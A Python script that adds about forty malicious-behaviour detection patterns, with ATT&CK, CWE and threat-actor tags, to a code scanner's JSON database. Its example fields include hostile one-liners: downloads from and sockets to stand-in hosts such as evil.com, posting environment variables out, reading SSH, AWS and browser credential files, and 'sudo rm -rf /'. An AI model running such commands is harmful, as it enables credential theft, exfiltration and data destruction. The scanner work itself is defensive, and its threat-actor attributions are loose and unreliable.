#!/usr/bin/env python3
"""
Expand dangerous_functions_expanded.json with 100+ real-world threat patterns
Includes full ATT&CK mapping, threat actors, and mitigations
"""

import json
from pathlib import Path

def load_current_patterns():
    """Load existing pattern database"""
    pattern_file = Path(__file__).parent.parent / "references" / "dangerous_functions_expanded.json"
    with open(pattern_file, 'r') as f:
        return json.load(f)

def add_credential_theft_patterns(data):
    """Category 1: Credential Theft - HIGH severity"""
    new_patterns = {
        "os.environ.get": {
            "severity": "HIGH",
            "cvss": 7.5,
            "cwe": "CWE-200",
            "attack_id": "T1552.001",
            "tactic": "Credential Access",
            "description": "Accesses environment variables (potential credential theft)",
            "risk": "Can expose API keys, tokens, passwords stored in environment",
            "safe_alternative": "Use dedicated credential management (e.g., keyring, vault)",
            "detection_pattern": "os\\.environ\\.(get|__getitem__)",
            "example_vulnerable": "api_key = os.environ.get('SECRET_KEY')",
            "example_safe": "# Use keyring or secure vault",
            "threat_actors": ["APT28", "APT29", "Lazarus Group"],
            "mitigations": ["M1047", "M1041"]
        },
        "os.getenv": {
            "severity": "HIGH",
            "cvss": 7.5,
            "cwe": "CWE-200",
            "attack_id": "T1552.001",
            "tactic": "Credential Access",
            "description": "Reads environment variables (credential exposure)",
            "risk": "Exposes sensitive data from environment",
            "safe_alternative": "Secure credential storage",
            "detection_pattern": "os\\.getenv\\s*\\(",
            "example_vulnerable": "password = os.getenv('DB_PASSWORD')",
            "example_safe": "# Use credential manager",
            "threat_actors": ["APT28", "APT29"],
            "mitigations": ["M1047"]
        },
        "pathlib_ssh_access": {
            "severity": "CRITICAL",
            "cvss": 9.0,
            "cwe": "CWE-552",
            "attack_id": "T1552.004",
            "tactic": "Credential Access",
            "description": "Accesses SSH private keys",
            "risk": "SSH key theft for lateral movement",
            "safe_alternative": "Never access user SSH keys",
            "detection_pattern": "(\\.ssh[/\\\\]id_rsa|\\.ssh[/\\\\]id_ed25519|\\.ssh[/\\\\]id_ecdsa)",
            "example_vulnerable": "key = Path.home() / '.ssh' / 'id_rsa'",
            "example_safe": "# DO NOT access SSH keys",
            "threat_actors": ["APT29", "Turla", "Lazarus Group"],
            "mitigations": ["M1027", "M1022"]
        },
        "aws_credentials": {
            "severity": "CRITICAL",
            "cvss": 9.0,
            "cwe": "CWE-522",
            "attack_id": "T1552.001",
            "tactic": "Credential Access",
            "description": "Accesses AWS credentials file",
            "risk": "Cloud infrastructure compromise",
            "safe_alternative": "Use IAM roles, never read credentials file",
            "detection_pattern": "(\\.aws[/\\\\]credentials|\\.aws[/\\\\]config)",
            "example_vulnerable": "creds = Path.home() / '.aws' / 'credentials'",
            "example_safe": "# Use boto3 with IAM roles",
            "threat_actors": ["APT28", "APT41", "HAFNIUM"],
            "mitigations": ["M1047", "M1026"]
        },
        "chrome_passwords": {
            "severity": "CRITICAL",
            "cvss": 8.5,
            "cwe": "CWE-555",
            "attack_id": "T1555.003",
            "tactic": "Credential Access",
            "description": "Accesses Chrome password database",
            "risk": "Steals saved browser passwords",
            "safe_alternative": "Never access browser credential stores",
            "detection_pattern": "(Chrome[/\\\\].*Login Data|chrome.*passwords)",
            "example_vulnerable": "db = 'Chrome/Default/Login Data'",
            "example_safe": "# DO NOT access browser passwords",
            "threat_actors": ["Emotet", "Trickbot", "Dridex"],
            "mitigations": ["M1027", "M1017"]
        },
        "firefox_passwords": {
            "severity": "CRITICAL",
            "cvss": 8.5,
            "cwe": "CWE-555",
            "attack_id": "T1555.003",
            "tactic": "Credential Access",
            "description": "Accesses Firefox password files",
            "risk": "Steals Firefox saved credentials",
            "safe_alternative": "Never access browser data",
            "detection_pattern": "(logins\\.json|key4\\.db|Firefox.*signons)",
            "example_vulnerable": "ff_db = 'Firefox/logins.json'",
            "example_safe": "# DO NOT access browser data",
            "threat_actors": ["Emotet", "Trickbot"],
            "mitigations": ["M1027"]
        }
    }

    data['python']['high'].update(new_patterns)
    return data

def add_file_download_patterns(data):
    """Category 2: File Downloads - HIGH severity"""
    new_patterns = {
        "urllib.request.urlretrieve": {
            "severity": "HIGH",
            "cvss": 8.0,
            "cwe": "CWE-494",
            "attack_id": "T1105",
            "tactic": "Command and Control",
            "description": "Downloads files from URLs (ingress tool transfer)",
            "risk": "Can download and execute malware",
            "safe_alternative": "Validate URLs, use allowlists, scan downloads",
            "detection_pattern": "urllib\\.request\\.urlretrieve\\s*\\(",
            "example_vulnerable": "urlretrieve('http://evil.com/malware.py', '/tmp/mal.py')",
            "example_safe": "# Validate URL against allowlist first",
            "threat_actors": ["APT28", "APT29", "Lazarus Group", "APT41"],
            "mitigations": ["M1031", "M1021"]
        },
        "requests_file_download": {
            "severity": "HIGH",
            "cvss": 7.8,
            "cwe": "CWE-494",
            "attack_id": "T1105",
            "tactic": "Command and Control",
            "description": "HTTP download with file write (tool transfer)",
            "risk": "Downloads potentially malicious files",
            "safe_alternative": "Validate sources, scan content",
            "detection_pattern": "requests\\.(get|post).*\\.(content|text).*open\\s*\\(",
            "context_check": "requests + file write chain",
            "example_vulnerable": "open('file.exe', 'wb').write(requests.get(url).content)",
            "example_safe": "# Verify URL, scan before writing",
            "threat_actors": ["APT28", "Turla"],
            "mitigations": ["M1031"]
        },
        "wget_download": {
            "severity": "HIGH",
            "cvss": 8.0,
            "cwe": "CWE-494",
            "attack_id": "T1105",
            "tactic": "Command and Control",
            "description": "Uses wget to download files",
            "risk": "Command injection + file download",
            "safe_alternative": "Use Python libraries with validation",
            "detection_pattern": "wget.*http",
            "example_vulnerable": "subprocess.run(['wget', user_url])",
            "example_safe": "# Use requests with validation",
            "threat_actors": ["APT41", "Winnti Group"],
            "mitigations": ["M1038", "M1031"]
        },
        "curl_download": {
            "severity": "HIGH",
            "cvss": 8.0,
            "cwe": "CWE-494",
            "attack_id": "T1105",
            "tactic": "Command and Control",
            "description": "Uses curl to download files",
            "risk": "Downloads from attacker-controlled URLs",
            "safe_alternative": "Validated Python HTTP libraries",
            "detection_pattern": "curl.*-[oO]",
            "example_vulnerable": "os.system('curl -o /tmp/mal http://evil.com')",
            "example_safe": "# Use requests with URL validation",
            "threat_actors": ["Lazarus Group", "APT28"],
            "mitigations": ["M1038"]
        },
        "ftplib.retrbinary": {
            "severity": "MEDIUM",
            "cvss": 6.5,
            "cwe": "CWE-494",
            "attack_id": "T1105",
            "tactic": "Command and Control",
            "description": "FTP file download",
            "risk": "Downloads via FTP (unencrypted)",
            "safe_alternative": "SFTP or HTTPS",
            "detection_pattern": "ftplib.*retr(binary|lines)",
            "example_vulnerable": "ftp.retrbinary('RETR file', open('file', 'wb').write)",
            "example_safe": "# Use SFTP instead",
            "threat_actors": ["APT28"],
            "mitigations": ["M1031", "M1020"]
        }
    }

    data['python']['high'].update(new_patterns)
    return data

def add_destructive_patterns(data):
    """Category 3: Destructive Operations - CRITICAL severity"""
    new_patterns = {
        "shutil.rmtree": {
            "severity": "CRITICAL",
            "cvss": 9.5,
            "cwe": "CWE-73",
            "attack_id": "T1485",
            "tactic": "Impact",
            "description": "Recursively deletes directory trees (data destruction)",
            "risk": "Can wipe entire file systems",
            "safe_alternative": "Confirm operations, use trash instead of delete",
            "detection_pattern": "shutil\\.rmtree\\s*\\(",
            "example_vulnerable": "shutil.rmtree('/home/user/important')",
            "example_safe": "# Move to trash, confirm deletions",
            "threat_actors": ["Sandworm Team", "APT38", "NotPetya"],
            "mitigations": ["M1053", "M1041"]
        },
        "os.remove": {
            "severity": "HIGH",
            "cvss": 7.0,
            "cwe": "CWE-73",
            "attack_id": "T1485",
            "tactic": "Impact",
            "description": "Deletes files (data destruction)",
            "risk": "Can delete critical system/user files",
            "safe_alternative": "Validate paths, use trash",
            "detection_pattern": "os\\.(remove|unlink)\\s*\\(",
            "example_vulnerable": "os.remove('/etc/passwd')",
            "example_safe": "# Validate path, move to trash",
            "threat_actors": ["Sandworm Team"],
            "mitigations": ["M1053"]
        },
        "pathlib.Path.unlink": {
            "severity": "HIGH",
            "cvss": 7.0,
            "cwe": "CWE-73",
            "attack_id": "T1485",
            "tactic": "Impact",
            "description": "Deletes files via pathlib",
            "risk": "File deletion attack",
            "safe_alternative": "Validate paths before deletion",
            "detection_pattern": "\\.unlink\\s*\\(",
            "example_vulnerable": "Path('/important/file').unlink()",
            "example_safe": "# Confirm + validate path",
            "threat_actors": ["Sandworm Team"],
            "mitigations": ["M1053"]
        },
        "system_file_write": {
            "severity": "CRITICAL",
            "cvss": 9.0,
            "cwe": "CWE-732",
            "attack_id": "T1565.001",
            "tactic": "Impact",
            "description": "Writes to system files (data manipulation)",
            "risk": "System compromise, persistence",
            "safe_alternative": "Never write to /etc/, /sys/, /proc/",
            "detection_pattern": "open\\s*\\(['\"]/(etc|sys|proc|boot)/",
            "example_vulnerable": "open('/etc/passwd', 'w')",
            "example_safe": "# DO NOT write to system directories",
            "threat_actors": ["APT28", "Turla"],
            "mitigations": ["M1022", "M1026"]
        }
    }

    data['python']['critical'].update(new_patterns)
    return data

def add_obfuscation_patterns(data):
    """Category 4: Obfuscation - MEDIUM (context-aware)"""
    new_patterns = {
        "chr_obfuscation": {
            "severity": "MEDIUM",
            "cvss": 5.0,
            "cwe": "CWE-506",
            "attack_id": "T1027",
            "tactic": "Defense Evasion",
            "description": "Character encoding obfuscation (suspicious if with eval/exec)",
            "risk": "Hides malicious code from static analysis",
            "safe_alternative": "Use plain strings",
            "detection_pattern": "chr\\s*\\(\\d+\\).*join",
            "context_check": "Only flag if near eval/exec",
            "example_vulnerable": "''.join([chr(x) for x in [101,118,97,108]])",
            "example_safe": "# Use clear string literals",
            "threat_actors": ["APT28", "Lazarus Group"],
            "mitigations": ["M1049"]
        },
        "codecs.decode": {
            "severity": "MEDIUM",
            "cvss": 5.5,
            "cwe": "CWE-506",
            "attack_id": "T1027",
            "tactic": "Defense Evasion",
            "description": "Codec-based obfuscation (rot13, etc.)",
            "risk": "Obfuscates malicious strings",
            "safe_alternative": "Plaintext code",
            "detection_pattern": "codecs\\.decode\\s*\\(.*['\\\"]rot|base64|hex",
            "context_check": "Only flag if with execution",
            "example_vulnerable": "codecs.decode('riny', 'rot13')",
            "example_safe": "# No obfuscation needed",
            "threat_actors": ["Lazarus Group"],
            "mitigations": ["M1049"]
        },
        "bytes.fromhex": {
            "severity": "MEDIUM",
            "cvss": 5.0,
            "cwe": "CWE-506",
            "attack_id": "T1027",
            "tactic": "Defense Evasion",
            "description": "Hex decoding (obfuscation)",
            "risk": "Hides strings in hex form",
            "safe_alternative": "Clear strings",
            "detection_pattern": "bytes\\.fromhex\\s*\\(",
            "context_check": "Flag if near exec/eval",
            "example_vulnerable": "bytes.fromhex('6576616c')",
            "example_safe": "# Use string literals",
            "threat_actors": ["APT41"],
            "mitigations": ["M1049"]
        },
        "builtins_getattr": {
            "severity": "HIGH",
            "cvss": 7.5,
            "cwe": "CWE-506",
            "attack_id": "T1027.009",
            "tactic": "Defense Evasion",
            "description": "Accesses __builtins__ to hide function calls",
            "risk": "Evades static detection of eval/exec",
            "safe_alternative": "Direct function calls",
            "detection_pattern": "(__builtins__|getattr\\(__builtins__|__builtins__\\[)",
            "example_vulnerable": "getattr(__builtins__, 'eval')",
            "example_safe": "# Call functions directly",
            "threat_actors": ["APT28", "Turla"],
            "mitigations": ["M1049"]
        }
    }

    data['python']['medium'].update(new_patterns)
    return data

def add_network_exfiltration_patterns(data):
    """Category 5: Network Exfiltration - HIGH severity"""
    new_patterns = {
        "socket.connect": {
            "severity": "HIGH",
            "cvss": 7.5,
            "cwe": "CWE-200",
            "attack_id": "T1041",
            "tactic": "Exfiltration",
            "description": "Opens socket connection (potential C2/exfiltration)",
            "risk": "Data exfiltration, command and control",
            "safe_alternative": "Use HTTPS with cert pinning",
            "detection_pattern": "socket\\.connect\\s*\\(",
            "example_vulnerable": "sock.connect(('attacker.com', 443))",
            "example_safe": "# Use validated HTTPS endpoints",
            "threat_actors": ["APT28", "APT29", "Lazarus Group"],
            "mitigations": ["M1031", "M1037"]
        },
        "requests.post_data": {
            "severity": "MEDIUM",
            "cvss": 6.5,
            "cwe": "CWE-200",
            "attack_id": "T1041",
            "tactic": "Exfiltration",
            "description": "HTTP POST (potential data exfiltration)",
            "risk": "Can send sensitive data externally",
            "safe_alternative": "Validate destinations, encrypt data",
            "detection_pattern": "requests\\.post\\s*\\(",
            "context_check": "Only flag with env vars or file reads",
            "example_vulnerable": "requests.post(url, data=os.environ)",
            "example_safe": "# Validate destination, encrypt data",
            "threat_actors": ["APT41", "Winnti Group"],
            "mitigations": ["M1031", "M1057"]
        },
        "smtplib.send": {
            "severity": "HIGH",
            "cvss": 7.0,
            "cwe": "CWE-200",
            "attack_id": "T1048.003",
            "tactic": "Exfiltration",
            "description": "Sends email (exfiltration over alternative protocol)",
            "risk": "Email-based data exfiltration",
            "safe_alternative": "Use approved email services",
            "detection_pattern": "smtplib.*send(mail)?",
            "example_vulnerable": "smtp.send(attacker@evil.com, stolen_data)",
            "example_safe": "# Use corporate email only",
            "threat_actors": ["APT28", "Turla"],
            "mitigations": ["M1031"]
        }
    }

    data['python']['high'].update(new_patterns)
    return data

def add_persistence_patterns(data):
    """Category 6: Persistence - HIGH severity"""
    new_patterns = {
        "crontab_modification": {
            "severity": "HIGH",
            "cvss": 8.0,
            "cwe": "CWE-732",
            "attack_id": "T1053.003",
            "tactic": "Persistence",
            "description": "Modifies crontab (scheduled task persistence)",
            "risk": "Establishes persistence via cron",
            "safe_alternative": "Use systemd timers with proper permissions",
            "detection_pattern": "(crontab|/var/spool/cron)",
            "example_vulnerable": "os.system('crontab -e')",
            "example_safe": "# Use systemd timers",
            "threat_actors": ["APT28", "Turla", "Rocke"],
            "mitigations": ["M1018", "M1026"]
        },
        "bashrc_modification": {
            "severity": "HIGH",
            "cvss": 8.0,
            "cwe": "CWE-732",
            "attack_id": "T1546.004",
            "tactic": "Persistence",
            "description": "Modifies shell config files (persistence)",
            "risk": "Executes code on every shell login",
            "safe_alternative": "Never modify user shell configs",
            "detection_pattern": "(\\.bashrc|\\.zshrc|\\.profile|\\.bash_profile)",
            "example_vulnerable": "open('.bashrc', 'a').write('malicious code')",
            "example_safe": "# DO NOT modify shell configs",
            "threat_actors": ["Rocke", "TeamTNT"],
            "mitigations": ["M1022", "M1026"]
        },
        "systemd_service": {
            "severity": "CRITICAL",
            "cvss": 9.0,
            "cwe": "CWE-732",
            "attack_id": "T1543.002",
            "tactic": "Persistence",
            "description": "Creates systemd service (persistence)",
            "risk": "Automatic execution on boot",
            "safe_alternative": "Use package managers for service installation",
            "detection_pattern": "(/etc/systemd/|/lib/systemd/|\\.service)",
            "example_vulnerable": "service_file = '/etc/systemd/system/malware.service'",
            "example_safe": "# Use dpkg/rpm for services",
            "threat_actors": ["APT28", "Rocke"],
            "mitigations": ["M1018", "M1022"]
        },
        "windows_startup": {
            "severity": "HIGH",
            "cvss": 8.0,
            "cwe": "CWE-732",
            "attack_id": "T1547.001",
            "tactic": "Persistence",
            "description": "Adds to Windows startup folder",
            "risk": "Auto-execution on Windows login",
            "safe_alternative": "Use proper installers",
            "detection_pattern": "(Startup|Start Menu.*Programs.*Startup)",
            "example_vulnerable": "shutil.copy('malware.exe', startup_folder)",
            "example_safe": "# Use Windows Installer",
            "threat_actors": ["APT28", "Lazarus Group"],
            "mitigations": ["M1018"]
        }
    }

    data['python']['high'].update(new_patterns)
    return data

def add_process_manipulation_patterns(data):
    """Category 7: Process Manipulation - MEDIUM/HIGH"""
    new_patterns = {
        "ctypes.CDLL": {
            "severity": "HIGH",
            "cvss": 7.5,
            "cwe": "CWE-829",
            "attack_id": "T1055.001",
            "tactic": "Defense Evasion",
            "description": "Loads DLL/shared library (DLL injection)",
            "risk": "Can load malicious libraries",
            "safe_alternative": "Use Python libraries, avoid ctypes for untrusted code",
            "detection_pattern": "ctypes\\.(CDLL|WinDLL|OleDLL|PyDLL)\\s*\\(",
            "example_vulnerable": "ctypes.CDLL('malicious.so')",
            "example_safe": "# Use Python packages instead",
            "threat_actors": ["APT28", "Lazarus Group"],
            "mitigations": ["M1051"]
        },
        "multiprocessing_spawn": {
            "severity": "MEDIUM",
            "cvss": 6.0,
            "cwe": "CWE-78",
            "attack_id": "T1055",
            "tactic": "Privilege Escalation",
            "description": "Process spawning (potential injection)",
            "risk": "Can spawn malicious processes",
            "safe_alternative": "Validate process targets",
            "detection_pattern": "multiprocessing\\.(Process|spawn)",
            "context_check": "Flag if with user input",
            "example_vulnerable": "Process(target=user_function).start()",
            "example_safe": "# Validate process targets",
            "threat_actors": ["APT41"],
            "mitigations": ["M1026"]
        }
    }

    data['python']['high'].update(new_patterns)
    return data

def add_anti_analysis_patterns(data):
    """Category 8: Anti-Analysis - MEDIUM"""
    new_patterns = {
        "debugger_detection": {
            "severity": "MEDIUM",
            "cvss": 5.5,
            "cwe": "CWE-506",
            "attack_id": "T1497.001",
            "tactic": "Defense Evasion",
            "description": "Detects debuggers (anti-analysis)",
            "risk": "Evades debugging/analysis",
            "safe_alternative": "No legitimate need for debugger detection",
            "detection_pattern": "sys\\.gettrace\\s*\\(\\)",
            "example_vulnerable": "if sys.gettrace(): exit()",
            "example_safe": "# Remove anti-debug code",
            "threat_actors": ["Lazarus Group", "APT28"],
            "mitigations": ["M1049"]
        },
        "vm_detection": {
            "severity": "MEDIUM",
            "cvss": 5.5,
            "cwe": "CWE-506",
            "attack_id": "T1497.001",
            "tactic": "Defense Evasion",
            "description": "Detects virtual machines",
            "risk": "Evades sandboxed analysis",
            "safe_alternative": "No need for VM detection",
            "detection_pattern": "(VirtualBox|VMware|QEMU|Xen|vbox|vmx)",
            "example_vulnerable": "if 'VMware' in cpuinfo: exit()",
            "example_safe": "# Remove VM detection",
            "threat_actors": ["Emotet", "Trickbot"],
            "mitigations": ["M1049"]
        },
        "sleep_evasion": {
            "severity": "LOW",
            "cvss": 3.0,
            "cwe": "CWE-506",
            "attack_id": "T1497.003",
            "tactic": "Defense Evasion",
            "description": "Long sleep (sandbox evasion)",
            "risk": "Evades time-limited sandboxes",
            "safe_alternative": "Remove suspicious delays",
            "detection_pattern": "time\\.sleep\\s*\\(\\s*[3-9]\\d{2,}",
            "context_check": "Flag sleep > 300 seconds",
            "example_vulnerable": "time.sleep(3600)  # 1 hour",
            "example_safe": "# Reasonable delays only",
            "threat_actors": ["Emotet"],
            "mitigations": ["M1049"]
        }
    }

    data['python']['medium'].update(new_patterns)
    return data

def add_privilege_escalation_patterns(data):
    """Category 9: Privilege Escalation - CRITICAL"""
    new_patterns = {
        "setuid": {
            "severity": "CRITICAL",
            "cvss": 9.0,
            "cwe": "CWE-250",
            "attack_id": "T1548.001",
            "tactic": "Privilege Escalation",
            "description": "Sets UID (privilege escalation)",
            "risk": "Can elevate to root privileges",
            "safe_alternative": "Use proper authentication mechanisms",
            "detection_pattern": "os\\.(setuid|seteuid|setreuid)\\s*\\(",
            "example_vulnerable": "os.setuid(0)  # Become root",
            "example_safe": "# Use sudo or proper auth",
            "threat_actors": ["APT28", "Turla"],
            "mitigations": ["M1026", "M1028"]
        },
        "sudo_execution": {
            "severity": "HIGH",
            "cvss": 8.5,
            "cwe": "CWE-250",
            "attack_id": "T1548.003",
            "tactic": "Privilege Escalation",
            "description": "Executes commands with sudo",
            "risk": "Privilege escalation to root",
            "safe_alternative": "Request user authentication properly",
            "detection_pattern": "sudo\\s+",
            "example_vulnerable": "os.system('sudo rm -rf /')",
            "example_safe": "# Use PolicyKit for GUI apps",
            "threat_actors": ["APT28"],
            "mitigations": ["M1026", "M1028"]
        }
    }

    data['python']['critical'].update(new_patterns)
    return data

def add_code_injection_patterns(data):
    """Category 10: Code Injection - HIGH/CRITICAL"""
    new_patterns = {
        "types.FunctionType": {
            "severity": "CRITICAL",
            "cvss": 8.5,
            "cwe": "CWE-94",
            "attack_id": "T1055",
            "tactic": "Execution",
            "description": "Creates functions dynamically (code injection)",
            "risk": "Runtime code generation/injection",
            "safe_alternative": "Use normal function definitions",
            "detection_pattern": "types\\.FunctionType\\s*\\(",
            "example_vulnerable": "func = types.FunctionType(code_obj, globals())",
            "example_safe": "# Define functions normally",
            "threat_actors": ["APT41"],
            "mitigations": ["M1049", "M1026"]
        },
        "importlib.import_module": {
            "severity": "HIGH",
            "cvss": 7.5,
            "cwe": "CWE-829",
            "attack_id": "T1129",
            "tactic": "Execution",
            "description": "Dynamic module import (potential malicious module loading)",
            "risk": "Can import attacker-controlled modules",
            "safe_alternative": "Static imports only",
            "detection_pattern": "importlib\\.import_module\\s*\\(",
            "context_check": "Flag if with user input",
            "example_vulnerable": "importlib.import_module(user_module)",
            "example_safe": "import known_module",
            "threat_actors": ["APT28"],
            "mitigations": ["M1049"]
        },
        "code_manipulation": {
            "severity": "CRITICAL",
            "cvss": 9.0,
            "cwe": "CWE-94",
            "attack_id": "T1055",
            "tactic": "Execution",
            "description": "Manipulates __code__ objects",
            "risk": "Runtime code modification",
            "safe_alternative": "Never modify code objects",
            "detection_pattern": "\\.__code__\\s*=",
            "example_vulnerable": "func.__code__ = malicious_code",
            "example_safe": "# DO NOT modify code objects",
            "threat_actors": ["APT41", "Lazarus Group"],
            "mitigations": ["M1049"]
        }
    }

    data['python']['critical'].update(new_patterns)
    return data

def main():
    """Expand pattern database"""
    print("Loading current patterns...")
    data = load_current_patterns()

    print("Adding credential theft patterns (6)...")
    data = add_credential_theft_patterns(data)

    print("Adding file download patterns (5)...")
    data = add_file_download_patterns(data)

    print("Adding destructive operation patterns (4)...")
    data = add_destructive_patterns(data)

    print("Adding obfuscation patterns (4)...")
    data = add_obfuscation_patterns(data)

    print("Adding network exfiltration patterns (3)...")
    data = add_network_exfiltration_patterns(data)

    print("Adding persistence patterns (4)...")
    data = add_persistence_patterns(data)

    print("Adding process manipulation patterns (2)...")
    data = add_process_manipulation_patterns(data)

    print("Adding anti-analysis patterns (3)...")
    data = add_anti_analysis_patterns(data)

    print("Adding privilege escalation patterns (2)...")
    data = add_privilege_escalation_patterns(data)

    print("Adding code injection patterns (3)...")
    data = add_code_injection_patterns(data)

    # Count patterns
    critical = len(data['python']['critical'])
    high = len(data['python']['high'])
    medium = len(data['python']['medium'])
    low = len(data['python']['low'])
    total = critical + high + medium + low

    print("\n" + "=" * 70)
    print("PATTERN EXPANSION COMPLETE")
    print("=" * 70)
    print(f"CRITICAL: {critical} patterns")
    print(f"HIGH:     {high} patterns")
    print(f"MEDIUM:   {medium} patterns")
    print(f"LOW:      {low} patterns")
    print(f"TOTAL:    {total} patterns (was 27, added {total - 27})")
    print("=" * 70)

    # Save
    output_file = Path(__file__).parent.parent / "references" / "dangerous_functions_expanded_v3.json"
    with open(output_file, 'w') as f:
        json.dump(data, f, indent=2)

    print(f"\n✓ Saved to: {output_file}")
    print(f"\nNext steps:")
    print(f"1. Test patterns on malicious code samples")
    print(f"2. Validate false positive rate on marketplace sample")
    print(f"3. Replace dangerous_functions_expanded.json with v3")

if __name__ == '__main__':
    main()
